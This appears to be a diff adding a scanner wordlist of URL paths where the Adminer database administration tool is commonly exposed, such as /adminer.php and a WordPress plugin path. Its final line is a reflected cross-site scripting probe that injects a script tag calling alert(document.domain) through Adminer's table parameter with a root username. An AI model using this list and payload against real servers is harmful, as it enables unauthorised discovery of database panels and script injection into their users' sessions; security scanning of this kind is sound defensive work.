@@ -1,0 +1,10 @@
+/adminer.php
+/_adminer.php
+/adminer/
+/editor.php
+/mysql.php
+/sql.php
+/wp-content/plugins/adminer/adminer.php
+/admin.php
+/modules/sfkdbmanage/adminer.php
+/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
